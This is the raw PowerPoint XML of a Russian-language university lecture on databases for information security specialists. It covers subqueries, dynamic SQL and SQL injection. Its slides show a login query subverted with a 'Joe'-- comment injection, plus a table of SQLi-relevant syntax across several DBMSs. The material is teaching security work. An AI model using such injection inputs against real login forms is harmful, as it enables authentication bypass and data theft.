                  <a:srgbClr val="369461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 Password = 'qwerty’</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="36946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ru-RU" sz="16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Модифицированный запрос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UserlD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FROM Users </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="16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'Joe'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--'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 Password = 'qwerty'</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C0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4CD8AA-40A5-840F-7828-5AD0BDF77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6187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B2045-32C2-171F-1634-97C5D8FA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Инъекция при вставке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B95F46-18DA-C83F-B754-846975790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63</a:t>
            </a:fld>
            <a:endParaRPr lang="ru-RU"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF8D3F8B-E5A4-F65D-98C2-7F300526C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13" y="1894463"/>
            <a:ext cx="7872930" cy="11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051CBAE2-DD71-0172-4A48-3936E5E323FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="674212" y="1401855"/>
            <a:ext cx="8596668" cy="500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Легитимный запрос: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F4D9118-2A5F-BD34-9D14-7C5906624BFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723185" y="3158971"/>
            <a:ext cx="8596668" cy="500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Инъекция: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B116CF-D498-5C0A-0C6C-DFECE9C7B1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4211" y="3607801"/>
            <a:ext cx="7872930" cy="111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648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B2045-32C2-171F-1634-97C5D8FA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Инъекция при вставке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B95F46-18DA-C83F-B754-846975790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64</a:t>
            </a:fld>
            <a:endParaRPr lang="ru-RU"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF8D3F8B-E5A4-F65D-98C2-7F300526C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13" y="1894463"/>
            <a:ext cx="7872930" cy="11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051CBAE2-DD71-0172-4A48-3936E5E323FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="674212" y="1401855"/>
            <a:ext cx="8596668" cy="500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Легитимный запрос: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F4D9118-2A5F-BD34-9D14-7C5906624BFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="723185" y="3158971"/>
            <a:ext cx="8596668" cy="500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Инъекция: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B116CF-D498-5C0A-0C6C-DFECE9C7B1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4211" y="3607801"/>
            <a:ext cx="7872930" cy="11116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800BA8-CA51-7933-B873-2615883E7FB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1331" y="5078824"/>
            <a:ext cx="8188498" cy="11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1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E0312-EBA8-4BDC-E1CD-78B4A058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 СУБД и </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQLi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D0BE43-F77D-AA9E-F37A-8CEA0FBE5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65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A361202-F5AE-DD30-94AC-D75CB671E0D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9512" y="1624222"/>
          <a:ext cx="8784975" cy="47682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139848121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998866145"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1416588">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="65240825"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1070994">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4039024607"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="931953">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3596917191"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="931953">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="514505755"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1193127">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4237442497"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="506274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MySQL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MSSQL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MS Access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Oracle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DB2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Postgres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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2360153418"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1350065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Объединение строк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concat</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(,)</a:t>
                      </a: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concat_ws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(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>delim</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>,)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' '+' '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" "&amp;" "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' '||' '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'' concat ''</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1800">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p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" "+" "</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1800">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p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' '||' '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' '||' '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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2942336789"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="337516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Комментарии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-- и /**/ и #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-- и /*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-- и /*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-- и /*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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1914701990"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="337516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Объединение запросов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union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union и </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>;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union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union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union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union и </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>;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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1203519038"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="337516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Подзапросы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v.4.1 &gt;=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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2353670777"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="337516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Хранимые процедуры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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1124371799"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="675033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Наличие </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>information</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU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schema</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> или его аналога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v.5.0 &gt;=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244" marR="54244" marT="0" marB="0" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1424972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10737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12021</TotalTime>
  <Words>5036</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Экран (4:3)</PresentationFormat>
  <Paragraphs>909</Paragraphs>
  <Slides>65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65</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="74" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Cambria Math</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>PT Sans</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Wingdings 3</vt:lpstr>
      <vt:lpstr>SCC</vt:lpstr>
      <vt:lpstr>СУБД для специалиста  по информационной безопасности</vt:lpstr>
      <vt:lpstr>Темы лекции</vt:lpstr>
      <vt:lpstr>Построение  вложенных запросов</vt:lpstr>
      <vt:lpstr>Типы поздзапросов</vt:lpstr>
      <vt:lpstr>Подзапрос на равенство</vt:lpstr>
      <vt:lpstr>Подзапрос на равенство</vt:lpstr>
      <vt:lpstr>Подзапрос на сравнение</vt:lpstr>
      <vt:lpstr>Подзапрос на сравнение</vt:lpstr>
      <vt:lpstr>Подзапрос на сравнение</vt:lpstr>
      <vt:lpstr>Коррелированные подзапросы: пример 1</vt:lpstr>
      <vt:lpstr>Коррелированные подзапросы: пример 2</vt:lpstr>
      <vt:lpstr>Коррелированные подзапросы: пример 3</vt:lpstr>
      <vt:lpstr>Квантор существования</vt:lpstr>
      <vt:lpstr>Операторы ANY, SOME, ALL</vt:lpstr>
      <vt:lpstr>Монотонные запросы - Conjunctive Queries</vt:lpstr>
      <vt:lpstr>Не монотонные запросы и реализация деления</vt:lpstr>
      <vt:lpstr>Реализация деления: через контрпример</vt:lpstr>
      <vt:lpstr>Другие реализации деления: пример</vt:lpstr>
      <vt:lpstr>Другие реализации деления: контрпример Not IN</vt:lpstr>
      <vt:lpstr>Другие реализации деления: через группировку</vt:lpstr>
      <vt:lpstr>Другие реализации деления: через разность</vt:lpstr>
      <vt:lpstr>Другие реализации деления: через разность </vt:lpstr>
      <vt:lpstr>Примеры сложных SQL- запросов</vt:lpstr>
      <vt:lpstr>Пример 1 - задача</vt:lpstr>
      <vt:lpstr>Пример 1 - решение</vt:lpstr>
      <vt:lpstr>Пример 2 - задача</vt:lpstr>
      <vt:lpstr>Пример 2 - решение</vt:lpstr>
      <vt:lpstr>Пример 3 – задача и ее интерпретации</vt:lpstr>
      <vt:lpstr>Пример 3 – решение 1 (этап 1)</vt:lpstr>
      <vt:lpstr>Пример 3 – решение 1 (этап 2)</vt:lpstr>
      <vt:lpstr>Пример 3 – решение 2</vt:lpstr>
      <vt:lpstr>Пример 3 – решение 2</vt:lpstr>
      <vt:lpstr>А есть ли циклы? - Курсоры</vt:lpstr>
      <vt:lpstr>Подходы к выполнению SQL-операторов  и подстановка данных в запрос</vt:lpstr>
      <vt:lpstr>Применение SQL со стороны приложения</vt:lpstr>
      <vt:lpstr>SQL – дескриптор</vt:lpstr>
      <vt:lpstr>Запрос к СУБД из приложения</vt:lpstr>
      <vt:lpstr>Динамический SQL - идеология </vt:lpstr>
      <vt:lpstr>Динамический SQL - Одношаговый интерфейс</vt:lpstr>
      <vt:lpstr>Динамический SQL - Многошаговый интерфейс</vt:lpstr>
      <vt:lpstr>Динамический SQL - выполнение</vt:lpstr>
      <vt:lpstr>Сравнение статического и динамического подходов</vt:lpstr>
      <vt:lpstr>Подстановка данных в SQL запрос </vt:lpstr>
      <vt:lpstr>Подстановка данных - Литералы</vt:lpstr>
      <vt:lpstr>Подстановка данных – Переменные подстановки</vt:lpstr>
      <vt:lpstr>Подстановка данных – Связанные переменные</vt:lpstr>
      <vt:lpstr>Подстановка данных – Что важно для безопасности?</vt:lpstr>
      <vt:lpstr>Безопасность динамического SQL  и инъекции в языки запросов</vt:lpstr>
      <vt:lpstr>Инъекции в языки запросов</vt:lpstr>
      <vt:lpstr>Классификация SQLi</vt:lpstr>
      <vt:lpstr>Обычная SQL - инъекция</vt:lpstr>
      <vt:lpstr>«Слепая» инъекция – основанная на ошибке</vt:lpstr>
      <vt:lpstr>«Двойная слепая» (double blind) инъекция</vt:lpstr>
      <vt:lpstr>Информированность злоумышленника – получение схемы</vt:lpstr>
      <vt:lpstr>Информированность злоумышленника – схема БД</vt:lpstr>
      <vt:lpstr>Узнаем имя таблицы</vt:lpstr>
      <vt:lpstr>Узнаем схему (атрибуты) таблицы</vt:lpstr>
      <vt:lpstr>Инъекция во входной параметр - строковый параметр</vt:lpstr>
      <vt:lpstr>Инъекция во входной параметр - числовой параметр</vt:lpstr>
      <vt:lpstr>Инъекция в прямой запрос</vt:lpstr>
      <vt:lpstr>Инъекция в процедуру</vt:lpstr>
      <vt:lpstr>Использование комментария для усечения запроса</vt:lpstr>
      <vt:lpstr>Инъекция при вставке данных</vt:lpstr>
      <vt:lpstr>Инъекция при вставке данных</vt:lpstr>
      <vt:lpstr>Синтаксис СУБД и SQLi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771</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-04-03T06:05:28Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-02-29T10:44:12Z</dcterms:modified>
</cp:coreProperties>
</file>